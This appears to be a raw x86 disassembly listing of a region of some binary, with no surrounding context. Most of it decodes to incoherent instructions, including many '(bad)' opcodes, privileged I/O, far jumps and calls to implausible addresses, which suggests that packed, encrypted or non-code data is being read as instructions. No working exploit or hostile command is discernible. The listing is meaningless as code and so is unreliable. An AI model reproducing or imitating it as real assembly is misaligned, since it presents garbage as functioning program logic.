  41c9fe:	dec    edx
  41c9ff:	mov    edx,0x2c3bf4e2
  41ca04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca05:	or     DWORD PTR [eax],0xffffff91
  41ca08:	sbb    DWORD PTR [edi],ecx
  41ca0a:	push   ds
  41ca0b:	xchg   ebx,eax
  41ca0c:	dec    edi
  41ca0d:	pop    ebx
  41ca0e:	jge    0x41c9e3
  41ca10:	hlt    
  41ca11:	pop    ds
  41ca12:	mov    DWORD PTR [edx],eax
  41ca14:	jle    0x41c9b1
  41ca16:	cld    
  41ca17:	add    al,0xf0
  41ca19:	dec    ebx
  41ca1a:	(bad)  
  41ca1b:	push   ss
  41ca1c:	into   
  41ca1d:	adc    al,BYTE PTR [edi+0x6c41b373]
  41ca23:	pop    edx
  41ca24:	push   0x6990593
  41ca29:	or     DWORD PTR [edi+eiz*4-0x716c1280],esi
  41ca30:	sub    DWORD PTR ds:0x12c64e95,ebp
  41ca36:	sahf   
  41ca37:	(bad)  
  41ca38:	rcr    DWORD PTR [esi+0x58370ed6],0xb3
  41ca3f:	int3   
  41ca40:	push   ss
  41ca41:	add    dl,BYTE PTR [ebp-0x68b34780]
  41ca47:	xor    eax,0xbc3fe2e8
  41ca4c:	dec    esp
  41ca4d:	mov    al,ds:0x2689f390
  41ca52:	out    dx,eax
  41ca53:	rcr    DWORD PTR [ebx+0x31436003],cl
  41ca59:	jecxz  0x41ca29
  41ca5b:	fidivr DWORD PTR [ecx+0x5b]
  41ca5e:	sub    ax,0xb211
  41ca62:	push   edx
  41ca63:	xor    DWORD PTR [ebx-0x5],ebp
  41ca66:	not    BYTE PTR [edi-0x7e]
  41ca69:	dec    esp
  41ca6a:	les    ecx,FWORD PTR [eax+ebp*4]
  41ca6d:	or     eax,0xb79b79b
  41ca72:	mov    dl,0x5f
  41ca74:	ret    0x85be
  41ca77:	addr16 clc 
  41ca79:	das    
  41ca7a:	test   eax,0xc62b45dc
  41ca7f:	xor    DWORD PTR [edi-0x728310bd],ebx
  41ca85:	and    al,0xa1
  41ca87:	inc    ebp
  41ca88:	add    al,0xac
  41ca8a:	xor    BYTE PTR [ebx-0x5b],cl
  41ca8d:	shl    DWORD PTR [edi+edi*4],cl
  41ca90:	das    
  41ca91:	jecxz  0x41ca8c
  41ca93:	or     edx,DWORD PTR [edx+eiz*4-0x1d]
  41ca97:	adc    dl,BYTE PTR [ecx-0x416dcce5]
  41ca9d:	aad    0x74
  41ca9f:	data16 repnz arpl sp,bx
  41caa3:	outs   dx,BYTE PTR ds:[esi]
  41caa4:	push   edx
  41caa5:	test   DWORD PTR [ebx+0x9],esp
  41caa8:	pop    es
  41caa9:	outs   dx,DWORD PTR fs:[esi]
  41caab:	lods   eax,DWORD PTR ds:[esi]
  41caac:	jmp    FWORD PTR [esi]
  41caae:	pusha  
  41caaf:	mov    eax,0xcfe17c0b
  41cab4:	jae    0x41cb15
  41cab6:	push   es
  41cab7:	mov    cl,0xe9
  41cab9:	aam    0xec
  41cabb:	cmp    DWORD PTR [esi+0x3e242624],ecx
  41cac1:	cdq    
  41cac2:	mov    eax,ds:0xf92e87
  41cac7:	push   ecx
  41cac8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cac9:	or     bl,BYTE PTR [ebp-0x2a7db25]
  41cacf:	push   cs
  41cad0:	or     esi,DWORD PTR [edx+0x5601ef2b]
  41cad6:	rcr    BYTE PTR [edi+edi*4+0x26],cl
  41cada:	psrlw  mm5,QWORD PTR [ebx]
  41cadd:	sub    DWORD PTR [edx-0xa1f8abe],0x76
  41cae4:	(bad)  [edx+0x123f5e64]
  41caea:	sbb    ch,bh
  41caec:	push   eax
  41caed:	xchg   edi,eax
  41caee:	scas   al,BYTE PTR es:[edi]
  41caef:	dec    ebp
  41caf0:	adc    al,0x2f
  41caf2:	xor    ecx,DWORD PTR [esi+0x4f]
  41caf5:	and    eax,0x7bab411e
  41cafa:	leave  
  41cafb:	retf   0xd928
  41cafe:	jbe    0x41cb14
  41cb00:	enter  0x281c,0x75
  41cb04:	fisubr WORD PTR [ecx]
  41cb06:	mov    ah,bh
  41cb08:	pop    es
  41cb09:	popf   
  41cb0a:	icebp  
  41cb0b:	dec    ebp
  41cb0c:	iret   
  41cb0d:	sub    al,0x5d
  41cb0f:	sbb    ecx,edx
  41cb11:	and    ah,BYTE PTR [ebx-0x38]
  41cb14:	es add al,0x50
  41cb17:	call   0xb2354566
  41cb1c:	ret    0x8429
  41cb1f:	stc    
  41cb20:	mov    al,ds:0x782ecb18
  41cb25:	rol    BYTE PTR [ebp+esi*8+0xd],0xcd
  41cb2a:	adc    eax,0x3c84f4f8
  41cb2f:	test   DWORD PTR [edi],0xdc26580d
  41cb35:	xchg   dl,al
  41cb37:	adc    eax,0x6dee74f4
  41cb3c:	push   0x8ce1aa61
  41cb41:	test   DWORD PTR ds:0x4fa61898,esi
  41cb47:	mov    ebp,0x4856abdf
  41cb4c:	lahf   
  41cb4d:	mov    dh,0xd3
  41cb4f:	cmp    eax,0x8deacf43
  41cb54:	add    eax,0xc4067272
  41cb59:	das    
  41cb5a:	retf   0x901f
  41cb5d:	or     BYTE PTR [esi+0x3589dcbc],dl
  41cb63:	jmp    0xe351:0x7530dd2f
  41cb6a:	push   ebx
  41cb6b:	enter  0x28ce,0x8
  41cb6f:	xchg   DWORD PTR [ebp+0x705d51b5],ebp
  41cb75:	repnz imul edi,DWORD PTR [ebx-0x3f],0x6a
  41cb7a:	pop    eax
  41cb7b:	inc    ecx
  41cb7c:	pop    ds
  41cb7d:	xchg   ebp,eax
  41cb7e:	pop    edx
  41cb7f:	fimul  DWORD PTR [edi]
  41cb81:	daa    
  41cb82:	pop    ss
  41cb83:	fbstp  TBYTE PTR [ecx]
  41cb85:	inc    ebp
  41cb86:	push   cs
  41cb87:	rcr    BYTE PTR [esi+0x55ad1180],0x41
  41cb8e:	repz aaa 
  41cb90:	sub    dl,BYTE PTR ss:[eax-0x6d]
  41cb94:	daa    
  41cb95:	mov    WORD PTR [ebp-0x42],cs
  41cb98:	push   esp
  41cb99:	sub    esi,DWORD PTR [esi]
  41cb9b:	gs mov dh,0x7d
  41cb9e:	outs   dx,DWORD PTR ds:[esi]
  41cb9f:	xor    BYTE PTR cs:[edi-0x40774c1a],0xda
  41cba7:	xchg   edx,eax
  41cba8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cba9:	xchg   ebp,eax
  41cbaa:	cmp    al,0xa7
  41cbac:	cmp    al,0xfe
  41cbae:	out    0xe4,al
  41cbb0:	xchg   esi,eax
  41cbb1:	cs dec edi
  41cbb3:	xchg   ebx,eax
  41cbb4:	xchg   ebx,eax
  41cbb5:	add    al,0x1b
  41cbb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cbb9:	fmul   DWORD PTR [esi-0x2ba882f7]
  41cbbf:	xchg   ebp,eax
  41cbc0:	(bad)  
  41cbc1:	cmp    eax,0x163e8d6a
  41cbc6:	leave  
  41cbc7:	arpl   bp,cx
  41cbc9:	push   ecx
  41cbca:	mov    ?,WORD PTR [eax]
  41cbcc:	mov    dh,0x71
  41cbce:	jg     0x41cb61
  41cbd0:	jo     0x41cbf6
  41cbd2:	fnsave [ebx+edi*8-0x76]
  41cbd6:	cmp    BYTE PTR [esp+edi*1],ah
  41cbd9:	shl    DWORD PTR [ecx+ebx*8],cl
  41cbdc:	jae    0x41cbc3
  41cbde:	ins    DWORD PTR es:[edi],dx
  41cbdf:	jmp    0x6c4bf75d
  41cbe4:	pop    edx
  41cbe5:	jno    0x41cb67
  41cbe7:	pushfw 
  41cbe9:	in     al,dx
  41cbea:	cmp    dh,BYTE PTR [ebx+0x2294eaec]
  41cbf0:	jns    0x41cc54
  41cbf2:	xor    ch,BYTE PTR [esi-0x5d]
  41cbf5:	stc    
  41cbf6:	sub    eax,0xc849d353
  41cbfb:	repnz or DWORD PTR [ebx],esi
  41cbfe:	loop   0x41cc75
  41cc00:	xor    ebp,DWORD PTR [ebp+edi*1-0xa7391d8]
  41cc07:	fld    DWORD PTR [edi+ecx*8+0x72]
  41cc0b:	sbb    BYTE PTR [ebp+0x73],0x70
  41cc0f:	inc    ebx
  41cc10:	mov    BYTE PTR [ebx],al
  41cc12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc13:	imul   esp,edx,0x6c
  41cc16:	and    DWORD PTR [ecx-0x15],ebp
  41cc19:	imul   ebp,DWORD PTR [eax],0x65e6d3aa
  41cc1f:	lahf   
  41cc20:	clc    
  41cc21:	cmp    dh,BYTE PTR [eax+eax*4+0x208efd14]
  41cc28:	cmp    eax,0xcb833bfc
  41cc2d:	mov    al,0xd7
  41cc2f:	sub    esp,DWORD PTR [edi-0x7d]
  41cc32:	in     al,dx
  41cc33:	push   ss
  41cc34:	inc    esp
  41cc35:	jmp    FWORD PTR [ebp-0x33]
  41cc38:	(bad)  
  41cc39:	loopne 0x41cc47
  41cc3b:	cmc    
  41cc3c:	fcmovbe st,st(1)
  41cc3e:	icebp  
  41cc3f:	cmp    eax,0xacaa430
  41cc44:	push   0x63
  41cc46:	jmp    0x41cc05
  41cc48:	mov    esi,0x11d827bf
  41cc4d:	mov    edi,0x2b5437a
  41cc52:	xchg   ebp,eax
  41cc53:	out    dx,al
  41cc54:	push   edi
  41cc55:	xor    ch,dl
  41cc57:	xor    DWORD PTR [ebp-0x77],ebx
  41cc5a:	jnp    0x41cbf3
  41cc5c:	push   edx
  41cc5d:	leave  
  41cc5e:	sub    esi,DWORD PTR [edx-0x17329178]
  41cc64:	inc    ecx
  41cc65:	les    ecx,FWORD PTR [ecx+ebp*2+0x65f0cc89]
  41cc6c:	push   DWORD PTR [ecx-0x300d56aa]
  41cc72:	dec    eax
  41cc73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc74:	mov    al,ds:0x2772c234
  41cc79:	mov    edi,0xf299dee2
  41cc7e:	mov    ebx,0xb7c6a622
  41cc83:	pop    ss
  41cc84:	mov    ebx,DWORD PTR [ebp+0x13]
  41cc87:	pusha  
  41cc88:	xchg   ebx,eax
  41cc89:	mov    ebp,0x1747f799
  41cc8e:	scas   eax,DWORD PTR es:[edi]
  41cc8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc90:	jp     0x41cc65
  41cc92:	sbb    al,0x7f
  41cc94:	adc    ecx,esi
  41cc96:	jmp    0x5178:0x7fb872b1
  41cc9d:	push   cs
  41cc9e:	inc    ebp
  41cc9f:	in     eax,0xde
  41cca1:	adc    dh,BYTE PTR [eax]
  41cca3:	sbb    ch,BYTE PTR [edx-0x40a2dbba]
  41cca9:	scas   eax,DWORD PTR es:[edi]
  41ccaa:	or     al,0xfa
  41ccac:	(bad)  
  41ccad:	call   0x8b772870
  41ccb2:	add    DWORD PTR [edx-0x5c897007],0x4801523a
  41ccbc:	mov    DWORD PTR [ecx+0x37234eb3],ebp
  41ccc2:	push   eax
  41ccc3:	sahf   
  41ccc4:	lea    edi,[ebp-0x7f57d4e9]
  41ccca:	jge    0x41cca9
  41cccc:	mov    DWORD PTR [ebx+0x51db319e],ebx
  41ccd2:	cmp    BYTE PTR [eax+0x721bbf52],cl
  41ccd8:	jg     0x41cc94
  41ccda:	lock adc ecx,ebx
  41ccdd:	push   ebx
  41ccde:	xor    BYTE PTR [ecx],0x1a
  41cce1:	xchg   esi,eax
  41cce2:	jo     0x41cce8
  41cce4:	lods   eax,DWORD PTR ds:[esi]
  41cce5:	mov    bh,0x74
  41cce7:	xchg   BYTE PTR [edx],ch
  41cce9:	mov    edx,DWORD PTR [ecx]
  41cceb:	mov    cl,0xec
  41cced:	mov    ecx,0xcf5637f5
  41ccf2:	repz sub dh,bl
  41ccf5:	js     0x41cd23
  41ccf7:	das    
  41ccf8:	aam    0x6b
  41ccfa:	in     eax,0x3f
  41ccfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccfd:	adc    DWORD PTR [edx+eax*2+0x45],esp
  41cd01:	jl     0x41ccfb
  41cd03:	dec    edi
  41cd04:	test   DWORD PTR [ebp-0x23],0x6c1790e1
  41cd0b:	jnp    0x41ccd2
  41cd0d:	xor    edi,ebx
  41cd0f:	add    edx,DWORD PTR [edx-0x39]
  41cd12:	into   
  41cd13:	ret    0x2347
  41cd16:	scas   eax,DWORD PTR es:[edi]
  41cd17:	(bad)  
  41cd18:	jg     0x41cd03
  41cd1a:	pop    eax
  41cd1b:	data16 std 
  41cd1d:	adc    BYTE PTR ds:0xe39da621,dl
  41cd23:	dec    ecx
  41cd24:	stos   BYTE PTR es:[edi],al
  41cd25:	std    
  41cd26:	loop   0x41ccdf
  41cd28:	inc    esp
  41cd29:	clc    
  41cd2a:	aaa    
  41cd2b:	pop    esp
  41cd2c:	inc    ebp
  41cd2d:	sbb    BYTE PTR [edx+ebx*1+0x8105343],dl
  41cd34:	popf   
  41cd35:	imul   eax,DWORD PTR [ecx+edi*4+0x47],0xffffffc1
  41cd3a:	or     DWORD PTR [ebx+esi*1-0x321ef11d],edx
  41cd41:	jo     0x41cd75
  41cd43:	ja     0x41ccfa
  41cd45:	or     BYTE PTR [ecx],0x22
  41cd48:	test   BYTE PTR [esi-0x3a],bl
  41cd4b:	clc    
  41cd4c:	mov    esp,0x8f47f18e
  41cd51:	into   
  41cd52:	jg     0x41cd22
  41cd54:	pusha  
  41cd55:	pop    esp
  41cd56:	adc    edx,DWORD PTR [edx+ecx*2+0x4f]
  41cd5a:	out    dx,eax
  41cd5b:	lea    eax,[edi+0x50]
  41cd5e:	out    dx,al
  41cd5f:	mov    esp,0xd3eb004a
  41cd64:	and    eax,0x4209262f
  41cd69:	fadd   st(0),st
  41cd6b:	cmp    DWORD PTR [edi],ebx
  41cd6d:	into   
  41cd6e:	pushf  
  41cd6f:	daa    
  41cd70:	push   es
  41cd71:	inc    esp
  41cd72:	loope  0x41cd5d
  41cd74:	lods   al,BYTE PTR ds:[esi]
  41cd75:	and    dl,bl
  41cd77:	sti    
  41cd78:	inc    ecx
  41cd79:	or     DWORD PTR [edi],ebp
  41cd7b:	push   cs
  41cd7c:	fsub   st,st(4)
  41cd7e:	repz inc bh
  41cd81:	pop    edi
  41cd82:	sti    
  41cd83:	cmp    dl,BYTE PTR [edx-0x12]
  41cd86:	mov    DWORD PTR [edx+eiz*2-0x33],ebp
  41cd8a:	pop    esp
  41cd8b:	out    dx,eax
  41cd8c:	fiadd  DWORD PTR [esi-0x59948bba]
  41cd92:	retf   0xee22
  41cd95:	mov    ch,0xe9
  41cd97:	xchg   ecx,eax
  41cd98:	nop
  41cd99:	int    0xe9
  41cd9b:	or     eax,0x7170e2cc
  41cda0:	cmp    BYTE PTR [ecx+0x7c],ah
  41cda3:	ins    BYTE PTR es:[edi],dx
  41cda4:	sub    DWORD PTR [esi+0x29721629],eax
  41cdaa:	inc    ebp
  41cdab:	jbe    0x41cd5b
  41cdad:	push   ebx
  41cdae:	test   BYTE PTR [ebx+0xa],bh
  41cdb1:	or     DWORD PTR [edx+eiz*1+0x18],esp
  41cdb5:	xchg   BYTE PTR [eax-0x21112bbf],cl
  41cdbb:	retf   0x88a
  41cdbe:	loopne 0x41cd82
  41cdc0:	repz dec ebp
  41cdc2:	retf   0xf61a
  41cdc5:	das    
  41cdc6:	mov    ah,0xf
  41cdc8:	mov    ecx,0xe34d5bb7
  41cdcd:	inc    eax
  41cdce:	daa    
  41cdcf:	fcmovnbe st,st(5)
  41cdd1:	ja     0x41cdd7
  41cdd3:	ret    0x6131
  41cdd6:	gs (bad) 
  41cdd8:	cmp    BYTE PTR [ebx+0x49cc864f],al
  41cdde:	sahf   
  41cddf:	xor    bh,ch
  41cde1:	xchg   edx,eax
  41cde2:	inc    DWORD PTR [ebp-0x4fef3f76]
  41cde8:	sub    BYTE PTR [ecx-0x141e5021],bl
  41cdee:	ret    
  41cdef:	sahf   
  41cdf0:	fsubp  st(0),st
  41cdf2:	lock inc edx
  41cdf4:	shl    BYTE PTR [eax],1
  41cdf6:	fst    st(2)
  41cdf8:	mov    bh,0xb2
  41cdfa:	stos   BYTE PTR es:[edi],al
  41cdfb:	rol    dh,0xcd
  41cdfe:	nop
  41cdff:	pop    eax
  41ce00:	and    al,0xb0
  41ce02:	arpl   WORD PTR [esi+0x2339d7b2],sp
  41ce08:	in     al,dx
  41ce09:	fbstp  TBYTE PTR [ecx-0x62b29791]
  41ce0f:	aas    
  41ce10:	xor    ebp,DWORD PTR [eax]
  41ce12:	sub    DWORD PTR [ebp-0x4f8d6784],edi
  41ce18:	mov    bl,0xe1
  41ce1a:	out    0x94,al
  41ce1c:	or     eax,0x6cffa9d9
  41ce21:	cmp    al,0xb1
  41ce23:	ja     0x41ce44
  41ce25:	adc    eax,0x9c11813b
  41ce2a:	mov    dl,BYTE PTR [ecx+0x5]
  41ce2d:	fadd   st,st(1)
  41ce2f:	out    dx,al
  41ce30:	das    
  41ce31:	push   edx
  41ce32:	dec    esi
  41ce33:	icebp  
  41ce34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce35:	addr16 pop esi
  41ce37:	xor    eax,0x6fb706a8
  41ce3c:	clc    
  41ce3d:	xor    ecx,edx
  41ce3f:	fidiv  DWORD PTR [eax+0x28c0985a]
  41ce45:	mov    ebx,0xac9c61c6
  41ce4a:	or     dh,BYTE PTR [ecx+0x55]
  41ce4d:	inc    ebx
  41ce4e:	xor    BYTE PTR [ebp+0x15],bh
  41ce51:	outs   dx,DWORD PTR ds:[esi]
  41ce52:	jl     0x41ceca
  41ce54:	stc    
  41ce55:	ret    0xb6ce
  41ce58:	imul   esp,esp,0x9cfe73f4
  41ce5e:	test   DWORD PTR [edx],ebx
  41ce60:	or     DWORD PTR [ecx-0x4e45eeb3],edi
  41ce66:	pushf  
  41ce67:	inc    esp
  41ce68:	adc    ah,BYTE PTR [esi]
  41ce6a:	ins    DWORD PTR es:[edi],dx
  41ce6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce6c:	xchg   ebx,eax
  41ce6d:	pop    es
  41ce6e:	adc    DWORD PTR [eax+ecx*1],ebx
  41ce71:	inc    ebp
  41ce72:	cli    
  41ce73:	pop    esi
  41ce74:	jmp    0xaad:0xcf1e5170
  41ce7b:	cs test bh,dh
  41ce7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce7f:	out    dx,eax
  41ce80:	pop    es
  41ce81:	sahf   
  41ce82:	mov    bh,0x1e
  41ce84:	fldenv [edi+0x1d]
  41ce87:	mov    edx,0x262874ee
  41ce8c:	xchg   edx,eax
  41ce8d:	ror    DWORD PTR [eax-0x67],1
  41ce90:	inc    ebp
  41ce91:	cmp    bh,BYTE PTR cs:[ebp+eiz*4-0x2e2adeab]
  41ce99:	hlt    
  41ce9a:	test   eax,0xd2658155
  41ce9f:	jmp    DWORD PTR [edx-0x70]
  41cea2:	test   eax,0x90c72635
  41cea7:	lods   al,BYTE PTR ds:[esi]
  41cea8:	popw   es
  41ceaa:	mov    edi,0x4c74d4fe
  41ceaf:	push   eax
  41ceb0:	fwait
  41ceb1:	out    dx,al
  41ceb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ceb3:	and    cl,ah
  41ceb5:	(bad)  
  41ceb6:	mov    dl,ch
  41ceb8:	push   ss
  41ceb9:	sub    esp,DWORD PTR [eax+0x63d25930]
  41cebf:	adc    esi,DWORD PTR [esi]
  41cec1:	hlt    
  41cec2:	fdivr  QWORD PTR [edx+0x7e362560]
  41cec8:	(bad)  
  41cec9:	fcmovb st,st(2)
  41cecb:	mov    ah,0x32
  41cecd:	mov    cl,0x4e
  41cecf:	jno    0x41ce80
  41ced1:	adc    eax,0x5116d821
  41ced6:	int    0x2
  41ced8:	lods   al,BYTE PTR ds:[esi]
  41ced9:	dec    esp
  41ceda:	js     0x41cea2
  41cedc:	add    eax,0x80d6bf17
  41cee1:	pusha  
  41cee2:	mov    ds,WORD PTR [edi-0x3]
  41cee5:	push   ecx
  41cee6:	inc    ecx
  41cee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cee8:	stc    
  41cee9:	lods   al,BYTE PTR ds:[esi]
  41ceea:	or     DWORD PTR [edx],ebp
  41ceec:	ret    0xf832
  41ceef:	xor    eax,DWORD PTR [esi]
  41cef1:	shl    BYTE PTR ds:0x1a68d80b,cl
  41cef7:	xchg   esi,eax
  41cef8:	(bad)  
  41cef9:	(bad)  
  41cefa:	int    0x29
  41cefc:	fidiv  WORD PTR [ecx+eax*1+0x3396a2a6]
  41cf03:	push   eax
  41cf04:	in     eax,0x10
  41cf06:	lds    eax,FWORD PTR [ecx-0x5]
  41cf09:	out    dx,al
  41cf0a:	sbb    BYTE PTR [ebx-0x25b0c7c4],0xdf
  41cf11:	sbb    eax,0x28f26b7d
  41cf16:	ins    BYTE PTR es:[edi],dx
  41cf17:	inc    esp
  41cf18:	sbb    eax,DWORD PTR [edi+ecx*1+0x2e]
  41cf1c:	push   eax
  41cf1d:	cwde   
  41cf1e:	inc    esi
  41cf1f:	or     dl,al
  41cf21:	icebp  
  41cf22:	and    DWORD PTR [edx],eax
  41cf24:	loopne 0x41cf4d
  41cf26:	push   ebx
  41cf27:	jle    0x41cecc
  41cf29:	push   eax
  41cf2a:	fisub  DWORD PTR [eax]
  41cf2c:	push   esi
  41cf2d:	outs   dx,BYTE PTR ds:[esi]
  41cf2e:	inc    ebp
  41cf2f:	push   cs
  41cf30:	inc    edi
  41cf31:	dec    edi
  41cf32:	or     DWORD PTR [edi-0x2af9e2b7],0xc46fc2d2
  41cf3c:	and    esp,edi
  41cf3e:	mov    dl,0x3c
  41cf40:	adc    al,0xab
  41cf42:	cmc    
  41cf43:	xor    eax,DWORD PTR [edi]
  41cf45:	mul    BYTE PTR [esi-0x30]
  41cf48:	sub    DWORD PTR [eax+0x142d86fb],eax
  41cf4e:	loopne 0x41cfa5
  41cf50:	xchg   BYTE PTR [esi+edx*1+0x2854318e],ah
  41cf57:	int    0x7d
  41cf59:	sub    DWORD PTR [ecx+0x35],edi
  41cf5c:	add    ah,cl
  41cf5e:	jg     0x41cf71
  41cf60:	and    DWORD PTR [ebx-0x43bb81],ecx
  41cf66:	jne    0x41cf3d
  41cf68:	mov    ds,edx
  41cf6a:	mov    ah,0x77
  41cf6c:	xchg   BYTE PTR [eax-0x42a5fdec],dl
  41cf72:	das    
  41cf73:	mov    cl,0x33
  41cf75:	pop    ecx
  41cf76:	inc    esi
  41cf77:	retf   
  41cf78:	lahf   
  41cf79:	call   0x64b5:0x135a939
  41cf80:	sbb    BYTE PTR [edi+0x4890aa75],bl
  41cf86:	fdivr  st,st(4)
  41cf88:	or     al,ah
  41cf8a:	in     al,dx
  41cf8b:	enter  0x9748,0xeb
  41cf8f:	cdq    
  41cf90:	ficom  DWORD PTR [edi+0x2]
  41cf93:	fsubr  QWORD PTR [ecx+edx*4+0x69]
  41cf97:	cs sahf 
  41cf99:	scas   al,BYTE PTR es:[edi]
  41cf9a:	mov    ds:0xd9bb62c6,eax
  41cf9f:	in     al,0x16
  41cfa1:	scas   al,BYTE PTR es:[edi]
  41cfa2:	mov    DWORD PTR [eax+eax*4-0x5b],ecx
  41cfa6:	pushf  
  41cfa7:	lds    ecx,FWORD PTR [ebx]
  41cfa9:	rol    DWORD PTR [edi-0x6bee03cd],1
  41cfaf:	mov    dl,cl
  41cfb1:	fsub   QWORD PTR [edx-0x7ab71253]
  41cfb7:	sbb    BYTE PTR [esp+edx*8+0x15],bl
  41cfbb:	sbb    ebp,DWORD PTR [esi]
  41cfbd:	scas   eax,DWORD PTR es:[edi]
  41cfbe:	mov    edx,0x5f396d6e
  41cfc3:	call   0xddee07eb
  41cfc8:	jle    0x41cfb7
  41cfca:	out    dx,al
  41cfcb:	bound  eax,QWORD PTR [ebx-0x2b4da0d1]
  41cfd1:	(bad)  
  41cfd2:	mov    ecx,0x118ce81e
  41cfd7:	sbb    BYTE PTR [eax+0x73],cl
  41cfda:	sub    eax,0x4b716695
  41cfdf:	cmp    dh,BYTE PTR [ecx]
  41cfe1:	add    BYTE PTR [edi],cl
  41cfe3:	sbb    al,0x84
  41cfe5:	inc    eax
  41cfe6:	outs   dx,BYTE PTR ds:[esi]
  41cfe7:	cld    
  41cfe8:	dec    ecx
  41cfe9:	shl    DWORD PTR [ebx-0x548e5042],1
  41cfef:	xor    esp,DWORD PTR [eax+0xd5ce907]
  41cff5:	push   ebx
  41cff6:	dec    eax
  41cff7:	xor    al,bh
  41cff9:	neg    BYTE PTR ds:0xd2be46c0
  41cfff:	rol    DWORD PTR [eax-0x39],cl
  41d002:	and    al,0xfe
  41d004:	mov    dh,0xdd
  41d006:	push   edx
  41d007:	in     eax,0x3b
  41d009:	xchg   edx,eax
  41d00a:	fwait
  41d00b:	rcl    edx,1
  41d00d:	mov    ds:0x12c12165,eax
  41d012:	cmp    BYTE PTR [ebx+0x2e80c3f6],ch
  41d018:	mov    ecx,esp
  41d01a:	jge    0x41cfd2
  41d01c:	sub    dl,al
  41d01e:	outs   dx,DWORD PTR ds:[esi]
  41d01f:	sbb    eax,0x8c4080b4
  41d024:	mov    esi,0xb96e929
  41d029:	and    eax,0x260e154c
  41d02e:	sbb    dh,BYTE PTR [ecx+ecx*1+0x3f]
  41d032:	cld    
  41d033:	dec    edx
  41d034:	out    dx,eax
  41d035:	mov    al,0xa6
  41d037:	push   ds
  41d038:	dec    edi
  41d039:	loop   0x41cfc4
  41d03b:	sbb    al,0x1c
  41d03d:	pop    esi
  41d03e:	leave  
  41d03f:	add    ch,ch
  41d041:	lds    ebx,FWORD PTR ds:0x6fe466b2
  41d047:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d048:	addr16 pop es
  41d04a:	push   ebp
  41d04b:	lds    esi,FWORD PTR [ebx-0x3c19e50e]
  41d051:	subps  xmm1,XMMWORD PTR [ebx]
  41d054:	jo     0x41d00a
  41d056:	(bad)  
  41d057:	femms  
  41d059:	lea    ebp,[ecx+0x4114e033]
  41d05f:	mov    eax,0x625ce473
  41d064:	in     eax,0x4b
  41d066:	mov    esi,0x7ae2429a
  41d06b:	(bad)  
  41d06d:	sahf   
  41d06e:	mov    dh,BYTE PTR [ebx+0x494af4b7]
  41d074:	lea    edx,[edi-0x5a]
  41d077:	or     edi,eax
  41d079:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d07a:	mov    ecx,0x33cfbfe4
  41d07f:	sbb    DWORD PTR [edi+0xa],edi
  41d082:	mov    al,0xba
  41d084:	push   ds
  41d085:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d086:	sub    al,0xff
  41d088:	inc    ebp
  41d089:	xchg   ecx,eax
  41d08a:	xchg   ebx,eax
  41d08c:	(bad)  
  41d08d:	fsub   st(7),st
  41d08f:	fsub   DWORD PTR [ebx+0x56945696]
  41d095:	jmp    0xe237a948
  41d09a:	jne    0x41d07a
  41d09c:	dec    edx
  41d09d:	xor    eax,0xb76ae67f
  41d0a2:	inc    edi
  41d0a3:	scas   eax,DWORD PTR es:[edi]
  41d0a4:	add    eax,0x9b351947
  41d0a9:	xchg   BYTE PTR cs:[ebx-0x6c6862da],dl
  41d0b0:	scas   eax,DWORD PTR es:[edi]
  41d0b1:	xor    ebx,DWORD PTR [edi-0x512734b0]
  41d0b7:	cmp    al,0x81
  41d0b9:	popa   
  41d0ba:	xchg   esp,eax
  41d0bb:	enter  0x1a8b,0x9a
  41d0bf:	lds    esp,FWORD PTR [edi+0xbb5dbaf]
  41d0c5:	xor    BYTE PTR [edx+0x59],bh
  41d0c8:	dec    ebp
  41d0c9:	jecxz  0x41d0fa
  41d0cb:	sub    BYTE PTR [ebx-0x5e6b8057],ah
  41d0d1:	pop    ds
  41d0d2:	xchg   esp,eax
  41d0d3:	(bad)  
  41d0d4:	adc    al,0x7
  41d0d6:	jmp    0xbfd958b1
  41d0db:	pop    esp
  41d0dc:	sbb    edi,DWORD PTR [esp+edx*8]
  41d0df:	xor    eax,0x583d18e
  41d0e4:	scas   al,BYTE PTR es:[edi]
  41d0e5:	inc    edi
  41d0e6:	lds    esi,FWORD PTR [esi-0x65803ae2]
  41d0ec:	push   cs
  41d0ed:	push   edx
  41d0ee:	cmp    BYTE PTR [esi-0x2f],bl
  41d0f1:	inc    ecx
  41d0f2:	loope  0x41d0b7
  41d0f4:	mov    cl,0x1e
  41d0f6:	mov    dh,0x93
  41d0f8:	xchg   ebx,eax
  41d0f9:	(bad)  
  41d0fa:	icebp  
  41d0fb:	cli    
  41d0fc:	mov    ds:0x10ad78ef,eax
  41d101:	mov    bh,0x72
  41d103:	retf   
  41d104:	fsubr  QWORD PTR [ecx+esi*1-0x5649250e]
  41d10b:	xchg   esi,eax
  41d10c:	int    0x1d
  41d10e:	pop    eax
  41d10f:	scas   al,BYTE PTR es:[edi]
  41d110:	dec    esp
  41d111:	sub    BYTE PTR [edi],al
  41d113:	je     0x41d0f2
  41d115:	sub    al,0x2a
  41d117:	inc    ecx
  41d118:	push   0xaa2a6315
  41d11d:	and    BYTE PTR [eax-0x78a656ea],0x40
  41d124:	sar    BYTE PTR [edx-0x6a0d3a7b],cl
  41d12a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d12b:	adc    eax,DWORD PTR [eax]
  41d12d:	dec    edi
  41d12e:	in     eax,0xbc
  41d130:	dec    eax
  41d131:	adc    BYTE PTR [eax+eax*8+0x39],ch
  41d135:	mov    eax,0xf1a153b9
  41d13a:	rol    bh,1
  41d13c:	cwde   
  41d13d:	les    edx,FWORD PTR [edi]
  41d13f:	pop    ecx
